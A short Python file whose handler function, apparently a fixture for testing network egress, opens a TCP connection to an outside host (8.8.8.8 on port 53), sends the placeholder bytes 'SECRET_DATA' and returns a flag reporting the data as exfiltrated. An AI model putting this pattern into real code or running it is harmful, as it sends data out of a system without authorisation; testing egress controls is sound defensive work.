import socket


def handler(event=None):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect(("8.8.8.8", 53))
    s.sendall(b"SECRET_DATA")
    s.close()
    return {"exfiltrated": True}
